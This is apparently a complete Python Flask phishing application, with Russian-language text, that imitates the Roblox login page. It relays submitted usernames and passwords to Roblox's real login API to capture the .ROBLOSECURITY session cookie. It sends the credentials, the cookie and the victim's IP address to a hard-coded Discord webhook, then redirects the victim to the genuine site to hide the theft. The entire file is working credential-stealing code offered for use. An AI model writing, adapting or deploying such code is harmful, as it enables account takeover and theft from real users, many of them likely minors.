from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
import uuid

app = Flask(__name__)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1538073991938445353/xa-WZkoA0pDAoLwzHmNwTGTcjU0XFZYDc_9ZrGCsckpxGQX_y-yMWIPikI3ZyfvN4FK_'

# URL для получения капчи
ROBLOX_CAPTCHA_URL = 'https://auth.roblox.com/v2/login'
ROBLOX_LOGIN_URL = 'https://auth.roblox.com/v2/login'

session = requests.Session()

def get_csrf_token():
    try:
        response = session.post(ROBLOX_CAPTCHA_URL, json={})
        if 'x-csrf-token' in response.headers:
            return response.headers['x-csrf-token']
        return ''
    except:
        return ''

def get_captcha_challenge():
    """Получаем challenge от Roblox для капчи"""
    csrf_token = get_csrf_token()
    headers = {
        'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0'),
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrf_token
    }
    try:
        response = session.post(ROBLOX_CAPTCHA_URL, json={'ctype': 'Username', 'cvalue': 'test', 'password': 'test'}, headers=headers)
        data = response.json()
        if 'errors' in data:
            for error in data['errors']:
                if 'Challenge' in error.get('message', ''):
                    # Ищем challenge ID в сообщении
                    import re
                    match = re.search(r'Challenge is required', error['message'])
                    if match:
                        # Получаем метаданные капчи
                        if 'fieldData' in error:
                            return error['fieldData']
                        return error
        return data
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox - Вход</title>
        <script src="https://js.arkoselabs.com/v2/0C4024A0-3C50-4B1A-9D3A-4C2B1A4C3D3B/api.js"></script>
        <style>
            body { background: #191919; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #232323; padding: 40px; border-radius: 10px; width: 400px; text-align: center; }
            .roblox-logo { color: white; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
            input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; font-size: 16px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
            .error { color: #ff4444; margin-top: 10px; display: none; }
            #captcha-container { margin: 15px 0; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="roblox-logo">ROBLOX</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <div id="captcha-container"></div>
                <button type="submit">Войти</button>
            </form>
            <div class="error" id="error">Неверный логин или пароль</div>
        </div>
        <script>
            let captchaToken = '';
            
            // Инициализируем капчу
            function initCaptcha() {
                const container = document.getElementById('captcha-container');
                window.arkose = new Arkose({
                    publicKey: '0C4024A0-3C50-4B1A-9D3A-4C2B1A4C3D3B',
                    container: container,
                    onCompleted: function(response) {
                        captchaToken = response.token;
                    },
                    onError: function(error) {
                        console.error('Captcha error:', error);
                    }
                });
            }
            
            // Загружаем капчу при загрузке страницы
            window.onload = initCaptcha;
            
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (!captchaToken) {
                    alert('Пожалуйста, пройдите капчу');
                    return;
                }
                
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        captchaToken: captchaToken
                    })
                });
                
                const data = await res.json();
                if (data.success) {
                    window.location.href = 'https://www.roblox.com';
                } else {
                    document.getElementById('error').style.display = 'block';
                    // Перезагружаем капчу
                    captchaToken = '';
                    initCaptcha();
                }
            });
        </script>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    captcha_token = data.get('captchaToken', '')
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Mozilla/5.0')
    
    # Получаем CSRF токен
    csrf_token = get_csrf_token()
    
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrf_token,
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    }
    
    payload = {
        'ctype': 'Username',
        'cvalue': username,
        'password': password,
        'challengeId': captcha_token,
        'challengeType': 'arkose',
        'challengeToken': captcha_token
    }
    
    try:
        response = session.post(ROBLOX_LOGIN_URL, json=payload, headers=headers)
        
        roblox_cookie = ''
        if '.ROBLOSECURITY' in session.cookies:
            roblox_cookie = session.cookies['.ROBLOSECURITY']
        
        # Отправляем в Discord
        discord_payload = {
            'embeds': [{
                'title': '🎮 ПОПЫТКА ВХОДА',
                'fields': [
                    {'name': '👤 Логин', 'value': f'```{username}```', 'inline': True},
                    {'name': '🔑 Пароль', 'value': f'```{password}```', 'inline': True},
                    {'name': '🍪 Куки', 'value': f'```{roblox_cookie if roblox_cookie else "Не получена"}```', 'inline': False},
                    {'name': '🌐 IP', 'value': f'```{client_ip}```', 'inline': True},
                    {'name': '📱 Ответ', 'value': f'```{response.text[:200]}```', 'inline': False}
                ]
            }]
        }
        requests.post(DISCORD_WEBHOOK, json=discord_payload)
        
        if response.status_code == 200 and roblox_cookie:
            return jsonify({'success': True})
        
        return jsonify({'success': False})
        
    except Exception as e:
        return jsonify({'success': False})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
